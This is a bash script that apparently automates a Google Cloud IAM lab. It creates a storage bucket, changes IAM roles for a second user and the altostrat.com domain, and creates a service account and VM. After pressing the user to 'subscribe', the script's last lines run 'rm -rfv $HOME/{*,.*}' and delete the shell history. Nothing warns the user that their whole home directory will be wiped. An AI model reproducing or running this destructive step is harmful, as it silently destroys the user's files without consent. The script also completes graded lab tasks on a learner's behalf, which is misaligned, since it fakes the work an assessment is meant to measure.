
BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}

Starting Execution 


${RESET}"
#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region $region
#gcloud config set compute/zone $region-a
#export ZONE=$region-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------# 

gsutil mb -l us gs://$DEVSHELL_PROJECT_ID


cat > sample.txt <<EOF_END
subscribe to quicklab
EOF_END

gsutil cp sample.txt gs://$DEVSHELL_PROJECT_ID


echo "${GREEN}${BOLD}

Task 3 Completed

${RESET}"

#Task 4

gcloud projects remove-iam-policy-binding $DEVSHELL_PROJECT_ID --member=user:$USER_2 --role=roles/viewer


echo "${GREEN}${BOLD}

Task 4 Completed

${RESET}"

#task 5

gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
  --role=roles/storage.objectViewer \
  --member=user:$USER_2

echo "${GREEN}${BOLD}

Task 5 Completed

${RESET}"


#task 6


gcloud iam service-accounts create read-bucket-objects --display-name "read-bucket-objects" 

gcloud iam service-accounts add-iam-policy-binding  read-bucket-objects@$DEVSHELL_PROJECT_ID.iam.gserviceaccount.com --member=domain:altostrat.com --role=roles/iam.serviceAccountUser

gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID --member=domain:altostrat.com --role=roles/compute.instanceAdmin.v1


gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID --member="serviceAccount:read-bucket-objects@$DEVSHELL_PROJECT_ID.iam.gserviceaccount.com" --role="roles/storage.objectViewer"


gcloud compute instances create demoiam \
  --zone=$ZONE \
  --machine-type=e2-micro \
  --image-family=debian-11 \
  --image-project=debian-cloud \
  --service-account=read-bucket-objects@$DEVSHELL_PROJECT_ID.iam.gserviceaccount.com



echo "${GREEN}${BOLD}

Task 6 Completed

Lab Completed !!!

${RESET}"

#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0